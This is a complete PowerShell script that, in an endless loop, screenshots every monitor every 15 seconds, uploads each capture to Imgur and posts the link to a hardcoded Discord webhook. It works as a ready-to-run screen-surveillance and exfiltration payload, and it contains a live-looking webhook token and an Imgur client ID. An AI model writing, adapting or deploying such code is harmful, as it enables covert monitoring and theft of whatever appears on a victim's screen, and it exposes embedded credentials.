function Capture-Screenshot {
    param (
        [string]$OutputFilePath
    )

    Add-Type -AssemblyName System.Windows.Forms,System.Drawing

    $screens = [Windows.Forms.Screen]::AllScreens

    $top    = ($screens.Bounds.Top    | Measure-Object -Minimum).Minimum
    $left   = ($screens.Bounds.Left   | Measure-Object -Minimum).Minimum
    $width  = ($screens.Bounds.Right  | Measure-Object -Maximum).Maximum
    $height = ($screens.Bounds.Bottom | Measure-Object -Maximum).Maximum

    $bounds   = [Drawing.Rectangle]::FromLTRB($left, $top, $width, $height)
    $bmp      = New-Object -TypeName System.Drawing.Bitmap -ArgumentList ([int]$bounds.width), ([int]$bounds.height)
    $graphics = [Drawing.Graphics]::FromImage($bmp)

    $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size)

    $bmp.Save($OutputFilePath)
    $graphics.Dispose()
    $bmp.Dispose()
}

function Upload-ToImgur {
    param (
        [string]$ImageFilePath,
        [string]$ClientId
    )

    try {
        $base64Image = [Convert]::ToBase64String([System.IO.File]::ReadAllBytes($ImageFilePath))
        $headers = @{
            Authorization = "Client-ID $ClientId"
        }
        $body = @{
            image = $base64Image
        }

        $response = Invoke-RestMethod -Uri "https://api.imgur.com/3/image" -Method Post -Headers $headers -Body $body
        $imageUrl = $response.data.link
        return $imageUrl
    }
    catch {
        Write-Host "Error occurred: $_"
        return $null
    }
}

function Send-DiscordMessage {
    param (
        [string]$WebhookUrl,
        [string]$ImageUrl
    )

    try {
        $payload = @{
            content = "Screenshot"
            embeds = @(
                @{
                    title = "Screenshot"
                    image = @{
                        url = $ImageUrl
                    }
                }
            )
        }

        $body = $payload | ConvertTo-Json -Depth 5  

        $headers = @{
            'Content-Type' = 'application/json'
        }

        Invoke-RestMethod -Uri $WebhookUrl -Method Post -Headers $headers -Body $body
    }
    catch {
        Write-Host "Error occurred: $_"
    }
}

$discordWebhookUrl = "https://discord.com/api/webhooks/1243928007182385182/SCzOW4wzwv6jNNPR45QctapEh1kTGVKqSDBrxn7gAR0J4K-pXfbE1IIbW9VrsfVXL6T6"
$imgurClientId = "ffd17df3bb7faec"

while($true) {
    $outputFilePath = "$env:temp\$env:computername-Capture.png"
    Capture-Screenshot -OutputFilePath $outputFilePath
    Write-Host "Screenshot captured and saved at: $outputFilePath"
    
    $imageUrl = Upload-ToImgur -ImageFilePath $outputFilePath -ClientId $imgurClientId
    if ($imageUrl) {
        Write-Host "Image uploaded to Imgur: $imageUrl"
        Send-DiscordMessage -WebhookUrl $discordWebhookUrl -ImageUrl $imageUrl
    }
    else {
        Write-Host "Failed to upload image to Imgur."
    }
    
    Start-Sleep -Seconds 15
}
